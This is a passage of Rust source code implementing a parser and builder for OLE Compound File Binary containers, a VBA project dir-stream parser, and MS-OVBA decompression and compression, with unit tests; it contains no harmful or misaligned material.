            out[eoff..eoff + 128].fill(0);
            // type already 0 (empty)
        }

        // ── Write stream data sectors ──
        for (idx, (_, data)) in self.streams.iter().enumerate() {
            let start_sector = stream_sectors[idx].0 as usize;
            let data_off = CFB_HEADER_SIZE + start_sector * ss;
            let end = (data_off + data.len()).min(out.len());
            let copy_len = end - data_off;
            out[data_off..data_off + copy_len].copy_from_slice(&data[..copy_len]);
        }

        out
    }
}

impl Default for CfbBuilder {
    fn default() -> Self {
        Self::new()
    }
}

// ── CFBF unit tests ───────────────────────────────────────────────────────────

#[cfg(test)]
mod cfb_tests {
    use super::*;

    fn minimal_cfb() -> Vec<u8> {
        CfbBuilder::new().build()
    }

    fn cfb_with_stream(name: &str, content: &[u8]) -> Vec<u8> {
        let mut b = CfbBuilder::new();
        b.add_stream(name, content.to_vec());
        b.build()
    }

    #[test]
    fn test_cfb_parse_minimal() {
        let data = minimal_cfb();
        let reader = CfbReader::parse(data).unwrap();
        assert_eq!(reader.sector_size, 512);
        assert_eq!(reader.mini_sector_size, 64);
    }

    #[test]
    fn test_cfb_invalid_magic() {
        let mut data = minimal_cfb();
        data[0] = 0x00;
        assert!(matches!(
            CfbReader::parse(data),
            Err(CfbError::InvalidMagic)
        ));
    }

    #[test]
    fn test_cfb_truncated() {
        let data = vec![0u8; 10];
        assert!(matches!(
            CfbReader::parse(data),
            Err(CfbError::TruncatedData)
        ));
    }

    #[test]
    fn test_cfb_root_entry_present() {
        let data = minimal_cfb();
        let reader = CfbReader::parse(data).unwrap();
        let root = reader.root_entry().unwrap();
        assert!(root.is_root());
        assert_eq!(root.name, "Root Entry");
    }

    #[test]
    fn test_cfb_stream_round_trip() {
        let content = b"Hello from VBA stream!";
        let data = cfb_with_stream("TestStream", content);
        let reader = CfbReader::parse(data).unwrap();
        let entry = reader.find_entry("TestStream").unwrap();
        let bytes = reader.read_stream(entry).unwrap();
        assert_eq!(&bytes, content);
    }

    #[test]
    fn test_cfb_find_entry_missing() {
        let data = cfb_with_stream("Workbook", b"data");
        let reader = CfbReader::parse(data).unwrap();
        assert!(reader.find_entry("NonExistent").is_none());
    }

    #[test]
    fn test_cfb_list_all_includes_stream() {
        let data = cfb_with_stream("MyStream", b"abc");
        let reader = CfbReader::parse(data).unwrap();
        let all = reader.list_all();
        let names: Vec<&str> = all.iter().map(|(n, _)| n.as_str()).collect();
        assert!(names.iter().any(|n| n.contains("MyStream")));
    }

    #[test]
    fn test_cfb_info_has_vba_false() {
        let data = cfb_with_stream("Workbook", b"xls data");
        let reader = CfbReader::parse(data).unwrap();
        let info = CfbInfo::from_reader(&reader);
        assert!(!info.has_vba);
    }

    #[test]
    fn test_cfb_info_has_vba_true() {
        let data = cfb_with_stream("VBA/Module1", b"vba code");
        let reader = CfbReader::parse(data).unwrap();
        let info = CfbInfo::from_reader(&reader);
        assert!(info.has_vba);
    }

    #[test]
    fn test_cfb_dir_entry_count() {
        let data = cfb_with_stream("Alpha", b"a");
        let reader = CfbReader::parse(data).unwrap();
        assert!(reader.dir_entry_count() >= 2); // root + stream
    }

    #[test]
    fn test_cfb_multiple_streams() {
        let mut b = CfbBuilder::new();
        b.add_stream("Stream1", vec![1u8; 100]);
        b.add_stream("Stream2", vec![2u8; 200]);
        let data = b.build();
        let reader = CfbReader::parse(data).unwrap();
        let e1 = reader.find_entry("Stream1").unwrap();
        let e2 = reader.find_entry("Stream2").unwrap();
        let d1 = reader.read_stream(e1).unwrap();
        let d2 = reader.read_stream(e2).unwrap();
        assert_eq!(d1, vec![1u8; 100]);
        assert_eq!(d2, vec![2u8; 200]);
    }

    #[test]
    fn test_cfb_empty_stream() {
        let data = cfb_with_stream("Empty", b"");
        let reader = CfbReader::parse(data).unwrap();
        let entry = reader.find_entry("Empty").unwrap();
        let bytes = reader.read_stream(entry).unwrap();
        assert!(bytes.is_empty());
    }

    #[test]
    fn test_cfb_follow_chain_no_cycle() {
        let fat: Vec<u32> = vec![ENDOFCHAIN];
        let chain = CfbReader::follow_chain_raw(&fat, 0);
        assert_eq!(chain, vec![0u32]);
    }

    #[test]
    fn test_cfb_follow_chain_multi() {
        let fat: Vec<u32> = vec![1, 2, ENDOFCHAIN];
        let chain = CfbReader::follow_chain_raw(&fat, 0);
        assert_eq!(chain, vec![0, 1, 2]);
    }

    #[test]
    fn test_cfb_decode_utf16_name() {
        let mut raw = vec![0u8; 64];
        // "VBA" in UTF-16LE
        raw[0] = b'V';
        raw[1] = 0;
        raw[2] = b'B';
        raw[3] = 0;
        raw[4] = b'A';
        raw[5] = 0;
        let s = CfbReader::decode_utf16_name(&raw, 8);
        assert_eq!(s, "VBA");
    }

    #[test]
    fn test_cfb_builder_default() {
        let b = CfbBuilder::default();
        let data = b.build();
        assert!(CfbReader::parse(data).is_ok());
    }

    #[test]
    fn test_cfb_info_display() {
        let data = cfb_with_stream("X", b"y");
        let reader = CfbReader::parse(data).unwrap();
        let info = CfbInfo::from_reader(&reader);
        let s = info.to_string();
        assert!(s.contains("CFB"));
    }

    #[test]
    fn test_cfb_large_stream() {
        let content: Vec<u8> = (0u8..=255).cycle().take(8000).collect();
        let data = cfb_with_stream("Large", &content);
        let reader = CfbReader::parse(data).unwrap();
        let entry = reader.find_entry("Large").unwrap();
        let out = reader.read_stream(entry).unwrap();
        assert_eq!(out.len(), 8000);
        assert_eq!(&out[..256], &content[..256]);
    }

    #[test]
    fn test_cfb_get_dir_entry_by_sid() {
        let data = cfb_with_stream("S", b"data");
        let reader = CfbReader::parse(data).unwrap();
        // SID 0 is always root
        let root = reader.get_dir_entry(0).unwrap();
        assert!(root.is_root());
    }

    #[test]
    fn test_cfb_get_dir_entry_invalid_sid() {
        let data = minimal_cfb();
        let reader = CfbReader::parse(data).unwrap();
        assert!(reader.get_dir_entry(FREE_SECT).is_none());
        assert!(reader.get_dir_entry(ENDOFCHAIN).is_none());
    }

    #[test]
    fn test_cfb_error_display() {
        assert!(CfbError::InvalidMagic.to_string().contains("magic"));
        assert!(CfbError::TruncatedData.to_string().contains("truncated"));
        assert!(CfbError::StreamTooLarge.to_string().contains("large"));
        assert!(
            CfbError::InvalidDirectoryEntry
                .to_string()
                .contains("directory")
        );
        assert!(
            CfbError::InvalidSector(0xDEAD)
                .to_string()
                .contains("sector")
        );
        assert!(CfbError::Other("oops".into()).to_string().contains("oops"));
    }

    #[test]
    fn test_cfb_error_into_ole_error() {
        let ole_err: OleError = CfbError::InvalidMagic.into();
        assert!(ole_err.to_string().contains("magic"));
    }

    #[test]
    fn test_cfb_dir_entry_display() {
        let mut b = CfbBuilder::new();
        b.add_stream("DisplayTest", b"hello".to_vec());
        let data = b.build();
        let reader = CfbReader::parse(data).unwrap();
        let e = reader.find_entry("DisplayTest").unwrap();
        let s = e.to_string();
        assert!(s.contains("DisplayTest"));
        assert!(s.contains("stream"));
    }

    #[test]
    fn test_cfb_sector_size_v4() {
        let b = CfbBuilder::new_v4();
        let data = b.build();
        let reader = CfbReader::parse(data).unwrap();
        assert_eq!(reader.sector_size, 4096);
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// VBA Project Parser (MS-OVBA)
// ═══════════════════════════════════════════════════════════════════════════════

use std::collections::HashMap;

// ── VbaError ──────────────────────────────────────────────────────────────────

/// Errors produced while parsing a VBA project.
#[derive(Debug, thiserror::Error)]
pub enum VbaError {
    #[error("VBA stream not found: {0}")]
    StreamNotFound(String),
    #[error("decompression error: {0}")]
    DecompressError(String),
    #[error("dir stream parse error: {0}")]
    DirParseError(String),
    #[error("invalid record type {0:#06x}")]
    InvalidRecord(u16),
    #[error("UTF-8 decode error")]
    Utf8Error,
    #[error("CFB error: {0}")]
    Cfb(#[from] CfbError),
    #[error("VBA error: {0}")]
    Other(String),
}

// ── VbaRefType ────────────────────────────────────────────────────────────────

/// Kinds of external references inside a VBA project dir stream.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum VbaRefType {
    /// REFERENCEREGISTERED (0x000D) — typelib registered in the Windows registry.
    Registered,
    /// REFERENCEPROJECT (0x000E) — reference to another VBA project.
    Project,
    /// REFERENCECONTROL (0x002F) — OLE control reference.
    Control,
    /// REFERENCENOMINAL (0x0016) / twiddled.
    Twiddled,
    /// REFERENCEEXTENDED / custom.
    Extended,
}

impl std::fmt::Display for VbaRefType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Registered => write!(f, "Registered"),
            Self::Project => write!(f, "Project"),
            Self::Control => write!(f, "Control"),
            Self::Twiddled => write!(f, "Twiddled"),
            Self::Extended => write!(f, "Extended"),
        }
    }
}

// ── VbaReference ─────────────────────────────────────────────────────────────

/// A reference entry from the VBA dir stream.
#[derive(Debug, Clone)]
pub struct VbaReference {
    pub name: String,
    pub ref_type: VbaRefType,
    /// The GUID / path / moniker depending on the reference type.
    pub libid: String,
}

impl std::fmt::Display for VbaReference {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{} ({}) libid={}", self.name, self.ref_type, self.libid)
    }
}

// ── VbaModuleRef ──────────────────────────────────────────────────────────────

/// A module descriptor read from the VBA dir stream.
#[derive(Debug, Clone)]
pub struct VbaModuleRef {
    /// Module name (same as the CFB stream name, usually).
    pub name: String,
    /// Byte offset of the compressed source code within the module's stream.
    pub offset: u32,
    /// Name of the CFB stream that holds the p-code + compressed source.
    pub stream_name: String,
    /// Module type: 1=procedural, 2=class/document/form.
    pub module_type: u8,
}

impl std::fmt::Display for VbaModuleRef {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "Module '{}' stream='{}' offset={} type={}",
            self.name, self.stream_name, self.offset, self.module_type
        )
    }
}

// ── VbaDirStream ──────────────────────────────────────────────────────────────

/// The parsed contents of the VBA `dir` stream (MS-OVBA 2.3.4).
#[derive(Debug, Clone)]
pub struct VbaDirStream {
    /// PROJECTSYSKIND — target platform (0=Win16, 1=Win32, 2=Mac, 3=Win64).
    pub syskind: u32,
    /// PROJECTLCID — locale identifier.
    pub lcid: u32,
    /// PROJECTCODEPAGE — the codepage used by the project.
    pub codepage: u16,
    /// PROJECTNAME — identifier of the VBA project.
    pub name: String,
    /// PROJECTDOCSTRING — human-readable description.
    pub doc_string: String,
    /// PROJECTHELPFILEPATH — first help file path.
    pub help_file: String,
    /// PROJECTHELPCONTEXT — help context identifier.
    pub help_context: u32,
    /// PROJECTLIBFLAGS — optional library flags.
    pub lib_flags: u32,
    /// PROJECTVERSION — (major, minor).
    pub version: (u32, u16),
    /// PROJECTCONSTANTS — conditional compilation constants.
    pub constants: String,
    /// All REFERENCE records.
    pub references: Vec<VbaReference>,
    /// All MODULE descriptors.
    pub modules: Vec<VbaModuleRef>,
}

impl Default for VbaDirStream {
    fn default() -> Self {
        Self {
            syskind: 0,
            lcid: 0,
            codepage: 1252,
            name: String::new(),
            doc_string: String::new(),
            help_file: String::new(),
            help_context: 0,
            lib_flags: 0,
            version: (0, 0),
            constants: String::new(),
            references: Vec::new(),
            modules: Vec::new(),
        }
    }
}

// ── VbaModule ─────────────────────────────────────────────────────────────────

/// A fully extracted VBA module.
#[derive(Debug, Clone)]
pub struct VbaModule {
    /// Module name.
    pub name: String,
    /// Decompressed source text, if extraction succeeded.
    pub source: Option<String>,
    /// Raw bytes of the module stream (p-code + compressed source).
    pub pcode: Vec<u8>,
    /// Byte offset in `pcode` where the compressed source starts.
    pub code_offset: u32,
}

impl VbaModule {
    /// Return the raw compressed source bytes.
    #[must_use]
    pub fn compressed_source(&self) -> &[u8] {
        let off = self.code_offset as usize;
        if off < self.pcode.len() {
            &self.pcode[off..]
        } else {
            &[]
        }
    }

    /// Returns `true` if source text was successfully extracted.
    #[must_use]
    pub const fn has_source(&self) -> bool {
        self.source.is_some()
    }
}

impl std::fmt::Display for VbaModule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "VbaModule '{}' pcode={} source={}",
            self.name,
            self.pcode.len(),
            if self.has_source() { "yes" } else { "no" }
        )
    }
}

// ── VbaProject ────────────────────────────────────────────────────────────────

/// The top-level parsed VBA project.
pub struct VbaProject {
    pub dir_stream: VbaDirStream,
    pub modules: HashMap<String, VbaModule>,
}

impl std::fmt::Debug for VbaProject {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("VbaProject")
            .field("name", &self.dir_stream.name)
            .field("modules", &self.modules.keys().collect::<Vec<_>>())
            .finish_non_exhaustive()
    }
}

impl VbaProject {
    /// Parse the VBA project from a [`CfbReader`].
    ///
    /// Reads and decompresses `VBA/dir`, then for each module, reads the
    /// corresponding CFB stream and decompresses the source.
    pub fn parse(cfb: &CfbReader) -> Result<Self, VbaError> {
        // Step 1: Locate and read the dir stream.
        let dir_entry = cfb
            .find_entry("VBA/dir")
            .or_else(|| cfb.find_entry("_VBA_PROJECT_CUR/VBA/dir"))
            .ok_or_else(|| VbaError::StreamNotFound("VBA/dir".into()))?;

        let compressed = cfb.read_stream(dir_entry)?;
        let decompressed = vba_decompress(&compressed)?;

        // Step 2: Parse the decompressed dir stream.
        let dir = Self::parse_dir_stream(&decompressed)?;

        // Step 3: For each module ref, read the stream and decompress source.
        let mut modules: HashMap<String, VbaModule> = HashMap::new();
        for module_ref in &dir.modules {
            let stream_path = format!("VBA/{}", module_ref.stream_name);
            let alt_path = format!("_VBA_PROJECT_CUR/VBA/{}", module_ref.stream_name);
            let stream_entry = cfb
                .find_entry(&stream_path)
                .or_else(|| cfb.find_entry(&alt_path));

            let pcode = match stream_entry {
                Some(e) => cfb.read_stream(e).unwrap_or_default(),
                None => Vec::new(),
            };

            let source = if pcode.len() > module_ref.offset as usize {
                let compressed_src = &pcode[module_ref.offset as usize..];
                vba_decompress(compressed_src)
                    .ok()
                    .and_then(|bytes| String::from_utf8(bytes).ok())
            } else {
                None
            };

            modules.insert(
                module_ref.name.clone(),
                VbaModule {
                    name: module_ref.name.clone(),
                    source,
                    pcode,
                    code_offset: module_ref.offset,
                },
            );
        }

        Ok(Self {
            dir_stream: dir,
            modules,
        })
    }

    /// Parse the decompressed dir stream according to MS-OVBA 2.3.4.
    fn parse_dir_stream(data: &[u8]) -> Result<VbaDirStream, VbaError> {
        let mut dir = VbaDirStream::default();
        let mut pos = 0usize;

        // Helper closures
        let read_u16 = |d: &[u8], p: usize| -> Option<u16> {
            d.get(p..p + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
        };
        let read_u32 = |d: &[u8], p: usize| -> Option<u32> {
            d.get(p..p + 4)
                .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
        };

        // We parse two sections: PROJECTSYSINFORMATION and PROJECTMODULES.
        // For PROJECTMODULES we build module records iteratively.
        let mut current_module: Option<VbaModuleRef> = None;
        let mut current_ref: Option<VbaReference> = None;

        loop {
            if pos + 6 > data.len() {
                break;
            }
            let record_type = match read_u16(data, pos) {
                Some(t) => t,
                None => break,
            };
            pos += 2;
            let record_len = match read_u32(data, pos) {
                Some(l) => l as usize,
                None => break,
            };
            pos += 4;
            let record_data = data.get(pos..pos + record_len).unwrap_or(&[]);
            pos += record_len;

            match record_type {
                // ── PROJECTSYSINFORMATION ──
                0x0001 => {
                    // PROJECTSYSKIND
                    if let Some(v) = read_u32(record_data, 0) {
                        dir.syskind = v;
                    }
                }
                0x0002 => {
                    // PROJECTLCID
                    if let Some(v) = read_u32(record_data, 0) {
                        dir.lcid = v;
                    }
                }
                0x0003 => { // PROJECTLCIDINVOKE (ignored)
                }
                0x0004 => {
                    // PROJECTCODEPAGE
                    if let Some(v) = read_u16(record_data, 0) {
                        dir.codepage = v;
                    }
                }
                0x0006 => {
                    // PROJECTNAME
                    dir.name = String::from_utf8_lossy(record_data).into_owned();
                }
                0x0007 | 0x0040 => {
                    // PROJECTDOCSTRING / Unicode variant
                    if record_type == 0x0007 {
                        dir.doc_string = String::from_utf8_lossy(record_data).into_owned();
                    }
                }
                0x0008 | 0x003D => {
                    // PROJECTHELPFILEPATH
                    if record_type == 0x0008 {
                        dir.help_file = String::from_utf8_lossy(record_data).into_owned();
                    }
                }
                0x000D => {
                    // PROJECTHELPCONTEXT
                    if let Some(v) = read_u32(record_data, 0) {
                        dir.help_context = v;
                    }
                }
                0x000E => {
                    // PROJECTLIBFLAGS
                    if let Some(v) = read_u32(record_data, 0) {
                        dir.lib_flags = v;
                    }
                }
                0x0013 => {
                    // PROJECTMAJORVERSION
                    if let Some(v) = read_u32(record_data, 0) {
                        dir.version.0 = v;
                    }
                }
                0x0014 => {
                    // PROJECTMINORVERSION
                    if let Some(v) = read_u16(record_data, 0) {
                        dir.version.1 = v;
                    }
                }
                0x0016 => {
                    // PROJECTCONSTANTS
                    dir.constants = String::from_utf8_lossy(record_data).into_owned();
                }
                // ── PROJECTREFERENCES ──
                0x000F => {
                    // REFERENCENAME
                    // Save any in-progress reference.
                    if let Some(r) = current_ref.take() {
                        dir.references.push(r);
                    }
                    current_ref = Some(VbaReference {
                        name: String::from_utf8_lossy(record_data).into_owned(),
                        ref_type: VbaRefType::Extended,
                        libid: String::new(),
                    });
                }
                0x0033 => {
                    // REFERENCEORIGINAL libid
                    if let Some(ref mut r) = current_ref {
                        r.libid = String::from_utf8_lossy(record_data).into_owned();
                        r.ref_type = VbaRefType::Registered;
                    }
                }
                0x002F => {
                    // REFERENCECONTROL
                    if let Some(ref mut r) = current_ref {
                        r.ref_type = VbaRefType::Control;
                    }
                }
                // 0x000D / 0x000E are already handled above as PROJECTHELPCONTEXT /
                // PROJECTLIBFLAGS; the duplicate reference-record logic is folded here
                // into the catch-all arm via the REFERENCENAME handler (0x000F).
                // This comment block intentionally replaces the duplicate arms.
                // ── PROJECTMODULES ──
                0x000C => {
                    // MODULECOUNT — signals start of modules section
                    if let Some(r) = current_ref.take() {
                        dir.references.push(r);
                    }
                    // record_data is the count (u16), but we just let records flow.
                }
                0x0019 => {
                    // MODULENAME
                    if let Some(m) = current_module.take() {
                        dir.modules.push(m);
                    }
                    current_module = Some(VbaModuleRef {
                        name: String::from_utf8_lossy(record_data).into_owned(),
                        offset: 0,
                        stream_name: String::new(),
                        module_type: 0,
                    });
                }
                0x0031 => { // MODULENAMEUNICODE (skip, use MODULENAME)
                }
                0x001A => {
                    // MODULESTREAMNAME
                    if let Some(ref mut m) = current_module {
                        m.stream_name = String::from_utf8_lossy(record_data).into_owned();
                    }
                }
                0x001C => { // MODULEDOCSTRING
                }
                0x002C => {
                    // MODULETEXTOFFSET (actual field name in spec)
                    if let Some(ref mut m) = current_module
                        && let Some(v) = read_u32(record_data, 0) {
                            m.offset = v;
                        }
                }
                0x0021 | 0x0022 => {
                    // MODULETYPE procedural / class
                    if let Some(ref mut m) = current_module {
                        m.module_type = if record_type == 0x0021 { 1 } else { 2 };
                    }
                }
                0x0025 => { // MODULEREADONLY
                }
                0x0028 => { // MODULEPRIVATE
                }
                0x002B => {
                    // MODULE terminator
                    if let Some(m) = current_module.take() {
                        dir.modules.push(m);
                    }
                }
                0x0010 => {
                    // PROJECTMODULES terminator
                    break;
                }
                _ => {
                    // Unknown or optional record — skip.
                }
            }
        }

        // Flush any in-progress records.
        if let Some(r) = current_ref {
            dir.references.push(r);
        }
        if let Some(m) = current_module {
            dir.modules.push(m);
        }

        Ok(dir)
    }
}

// ── vba_decompress ────────────────────────────────────────────────────────────

/// Decompress a VBA stream using the MS-OVBA compression algorithm (section 2.4.1).
///
/// The compressed data starts with a signature byte `0x01`, followed by a series
/// of `CompressedChunks`.  Each `CompressedChunk` begins with a 2-byte header:
///
/// - bits 11..0 = `CompressedChunkSize` − 3
/// - bit  15    = `IsCompressed` flag
///
/// If `IsCompressed` == 0 the next 4096 bytes are a raw copy.
/// If `IsCompressed` == 1 the chunk consists of flag bytes and data tokens.
pub fn vba_decompress(compressed: &[u8]) -> Result<Vec<u8>, VbaError> {
    if compressed.is_empty() {
        return Ok(vec![]);
    }
    let mut output: Vec<u8> = Vec::new();
    let mut pos = 0usize;

    // The compressed stream may begin with the signature byte 0x01.
    if compressed.first() == Some(&0x01) {
        pos = 1;
    }

    while pos < compressed.len() {
        // Each chunk starts with a 2-byte header.
        if pos + 2 > compressed.len() {
            break;
        }
        let header = u16::from_le_bytes([compressed[pos], compressed[pos + 1]]);
        pos += 2;

        let chunk_size = ((header & 0x0FFF) as usize) + 3;
        let is_compressed = (header >> 15) & 1 == 1;

        let chunk_end = pos + chunk_size; // exclusive end within compressed[]

        if is_compressed {
            // Compressed chunk: process flag bytes.
            let chunk_start_output = output.len();
            while pos < chunk_end && pos < compressed.len() {
                // Flag byte: each bit controls 8 tokens (LSB first).
                let flag = compressed[pos];
                pos += 1;
                for bit in 0..8u8 {
                    if pos >= chunk_end || pos >= compressed.len() {
                        break;
                    }
                    if (flag >> bit) & 1 == 0 {
                        // Literal byte.
                        output.push(compressed[pos]);
                        pos += 1;
                    } else {
                        // Copy token: 2 bytes.
                        if pos + 2 > compressed.len() {
                            pos = compressed.len();
                            break;
                        }
                        let token = u16::from_le_bytes([compressed[pos], compressed[pos + 1]]);
                        pos += 2;

                        // The number of bits for the length field depends on how
                        // much output has been produced in the current chunk.
                        let decompressed_in_chunk = output.len() - chunk_start_output;
                        let (length_mask, offset_shift, length_base) =
                            copy_token_help(decompressed_in_chunk);

                        let length = (token & length_mask) as usize + length_base;
                        let offset = ((token >> offset_shift) as usize) + 1;

                        // Copy `length` bytes from `output[current - offset..]`.
                        let copy_src_start = output.len().checked_sub(offset);
                        match copy_src_start {
                            None => {
                                // Offset beyond start — treat as zero fill.
                                output.resize(output.len() + length, 0);
                            }
                            Some(src) => {
                                for i in 0..length {
                                    let byte = output[src + (i % offset)];
                                    output.push(byte);
                                }
                            }
                        }
                    }
                }
            }
        } else {
            // Raw copy: exactly 4096 bytes (or until end of chunk).
            let take = chunk_size.min(compressed.len().saturating_sub(pos));
            output.extend_from_slice(&compressed[pos..pos + take]);
            pos += take;
            // Pad with zeroes if chunk is shorter than 4096.
            while !output.len().is_multiple_of(4096) && take < 4096 {
                output.push(0);
            }
        }
        // Advance pos to chunk boundary in case we fell short.
        if pos < chunk_end {
            pos = chunk_end;
        }
    }

    Ok(output)
}

/// Compute the copy-token field widths for the current decompressed chunk size.
///
/// Returns `(length_mask, offset_shift_bits, length_base)`.
///
/// As described in MS-OVBA 2.4.1.3.6 `CopyToken`:
/// - If `DecompressedCurrent` - `ChunkStart` == 0: treat as 1 for this calculation.
/// - `LengthMask` = 0xFFFF >> `CopyBitCount`
/// - `OffsetMask` = ~`LengthMask`
/// - `BitCount` = the number of bits in the length field
fn copy_token_help(decompressed_in_chunk: usize) -> (u16, u8, usize) {
    let d = decompressed_in_chunk.max(1);
    // CopyBitCount = ceil(log2(d))
    let mut copy_bit_count: u8 = 1;
    while (1usize << copy_bit_count) < d {
        copy_bit_count += 1;
    }
    // Clamp to [4, 12].
    let copy_bit_count = copy_bit_count.clamp(4, 12);
    let length_bit_count = 16 - copy_bit_count;
    let length_mask: u16 = (1u16 << length_bit_count) - 1;
    let offset_shift: u8 = length_bit_count;
    let length_base: usize = 3;
    (length_mask, offset_shift, length_base)
}

/// Re-compress a raw byte buffer using the MS-OVBA algorithm.
///
/// This is a simple, non-optimal implementation that always emits literal bytes
/// (never back-references), producing valid but unoptimised compressed data.
/// Useful for round-trip tests.
#[must_use] 
pub fn vba_compress(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x01u8]; // signature byte
    let mut pos = 0usize;
    while pos < data.len() {
        let chunk = &data[pos..(pos + 4096).min(data.len())];
        pos += chunk.len();
        // We write a raw (uncompressed) chunk if it is exactly 4096 bytes,
        // otherwise emit as compressed with all literal tokens.
        if chunk.len() == 4096 {
            // Raw chunk: header with IsCompressed=0, size=4093 → 0x0FFD
            let header: u16 = 0x0FFD; // (4096-3) | 0x0000 — bit 15 clear
            out.extend_from_slice(&header.to_le_bytes());
            out.extend_from_slice(chunk);
        } else {
            // Compressed chunk with all literals.
            // Each group of 8 bytes = 1 flag byte (0x00) + 8 literal bytes.
            let mut chunk_buf: Vec<u8> = Vec::new();
            let mut i = 0;
            while i < chunk.len() {
                let take = (chunk.len() - i).min(8);
                chunk_buf.push(0x00); // all literal
                chunk_buf.extend_from_slice(&chunk[i..i + take]);
                i += take;
            }
            // CompressedChunkSize = chunk_buf.len() - 3 → fits in 12 bits
            let size = (chunk_buf.len() as u16).saturating_sub(3) & 0x0FFF;
            let header: u16 = 0x8000 | size; // IsCompressed=1
            out.extend_from_slice(&header.to_le_bytes());
            out.extend_from_slice(&chunk_buf);
        }
    }
    out
}

// ── VBA unit tests ────────────────────────────────────────────────────────────

#[cfg(test)]
mod vba_tests {
    use super::*;

    // ── vba_decompress ────────────────────────────────────────────────────────

    #[test]
    fn test_vba_decompress_empty() {
        assert_eq!(vba_decompress(&[]).unwrap(), Vec::<u8>::new());
    }

    #[test]
    fn test_vba_decompress_all_literals() {
        // Construct a compressed chunk manually: all 8 literal tokens.
        // Header: IsCompressed=1, size = 10 (flag + 8 literals + ... let's be precise)
        // flag byte 0x00 means 8 literals; we pass 4 literals then end.
        // Signature(0x01) + ChunkHeader(2) + FlagByte(1) + Literals(4) = 8 bytes total
        // ChunkSize field = 5 - 3 = 2, IsCompressed = 1 → header = 0x8002
        let mut input = vec![0x01u8]; // signature
        let header: u16 = 0x8002; // compressed, size=5 (2+3)
        input.extend_from_slice(&header.to_le_bytes());
        input.push(0x00); // flag: 8 literals
        input.extend_from_slice(b"abcd");
        let out = vba_decompress(&input).unwrap();
        assert_eq!(&out[..4], b"abcd");
    }

    #[test]
    fn test_vba_compress_decompress_roundtrip_small() {
        let original = b"Hello, VBA World!";
        let compressed = vba_compress(original);
        let decompressed = vba_decompress(&compressed).unwrap();
        assert_eq!(&decompressed[..original.len()], original.as_ref());
    }

    #[test]
    fn test_vba_compress_decompress_roundtrip_large() {
        let original: Vec<u8> = b"Sub Foo()\nMsgBox \"Hello\"\nEnd Sub\n"
            .iter()
            .copied()
            .cycle()
            .take(5000)
            .collect();
        let compressed = vba_compress(&original);
        let decompressed = vba_decompress(&compressed).unwrap();
        assert_eq!(&decompressed[..original.len()], original.as_slice());
    }

    #[test]
    fn test_copy_token_help_small() {
        let (lm, os, lb) = copy_token_help(1);
        assert_eq!(lb, 3);
        assert!(os > 0);
        let _ = lm;
    }

    #[test]
    fn test_copy_token_help_4096() {
        let (lm, os, _lb) = copy_token_help(4096);
        // At max chunk size: copy_bit_count = 12, length_bits = 4
        assert_eq!(os, 4);
        assert_eq!(lm, 0x000F);
    }

    // ── VbaError display ──────────────────────────────────────────────────────

    #[test]
    fn test_vba_error_stream_not_found() {
        let e = VbaError::StreamNotFound("VBA/dir".into());
        assert!(e.to_string().contains("VBA/dir"));
    }

    #[test]
    fn test_vba_error_decompress() {
        let e = VbaError::DecompressError("bad chunk".into());
        assert!(e.to_string().contains("bad chunk"));
    }

    #[test]
    fn test_vba_error_dir_parse() {
        let e = VbaError::DirParseError("eof".into());
        assert!(e.to_string().contains("eof"));
    }

    #[test]
    fn test_vba_ref_type_display() {
        assert_eq!(VbaRefType::Registered.to_string(), "Registered");
        assert_eq!(VbaRefType::Project.to_string(), "Project");
        assert_eq!(VbaRefType::Control.to_string(), "Control");
        assert_eq!(VbaRefType::Twiddled.to_string(), "Twiddled");
        assert_eq!(VbaRefType::Extended.to_string(), "Extended");
    }

    #[test]
    fn test_vba_module_ref_display() {
        let m = VbaModuleRef {
            name: "Module1".into(),
            offset: 100,
            stream_name: "Module1".into(),
            module_type: 1,
        };
        assert!(m.to_string().contains("Module1"));
        assert!(m.to_string().contains("100"));
    }

    #[test]
    fn test_vba_module_compressed_source() {
        let m = VbaModule {
            name: "Foo".into(),
            source: None,
            pcode: vec![0u8; 200],
            code_offset: 100,
        };
        assert_eq!(m.compressed_source().len(), 100);
    }

    #[test]
    fn test_vba_module_compressed_source_offset_overflow() {
        let m = VbaModule {
            name: "Foo".into(),
            source: None,
            pcode: vec![0u8; 50],
            code_offset: 200,
        };
        assert!(m.compressed_source().is_empty());
    }

    #[test]
    fn test_vba_module_has_source() {
        let m1 = VbaModule {
            name: "M".into(),
            source: Some("code".into()),
            pcode: vec![],
            code_offset: 0,
        };
        let m2 = VbaModule {
            name: "M".into(),
            source: None,
            pcode: vec![],
            code_offset: 0,
        };
        assert!(m1.has_source());
        assert!(!m2.has_source());
    }

    #[test]
    fn test_vba_module_display() {
        let m = VbaModule {
            name: "MyMod".into(),
            source: None,
            pcode: vec![1, 2, 3],
            code_offset: 0,
        };
        assert!(m.to_string().contains("MyMod"));
        assert!(m.to_string().contains("pcode=3"));
    }

    #[test]
    fn test_vba_dir_stream_default() {
        let dir = VbaDirStream::default();
        assert_eq!(dir.codepage, 1252);
        assert!(dir.references.is_empty());
        assert!(dir.modules.is_empty());
    }

    #[test]
    fn test_vba_reference_display() {
        let r = VbaReference {
            name: "stdole".into(),
            ref_type: VbaRefType::Registered,
            libid: "{00020430-0000-0000-C000-000000000046}".into(),
        };
        assert!(r.to_string().contains("stdole"));
        assert!(r.to_string().contains("Registered"));
    }

    #[test]
    fn test_vba_project_parse_no_dir_stream() {
        // CfbReader with no VBA streams → StreamNotFound
        let data = CfbBuilder::new().build();
        let cfb = CfbReader::parse(data).unwrap();
        let err = VbaProject::parse(&cfb).unwrap_err();
        assert!(matches!(err, VbaError::StreamNotFound(_)));
    }

    #[test]
    fn test_vba_project_parse_with_dir_stream() {
        // Build a minimal dir stream with a PROJECTSYSKIND record.
        // Record: type=0x0001, len=4, value=0x00000001 (Win32)
        let mut dir_data: Vec<u8> = Vec::new();
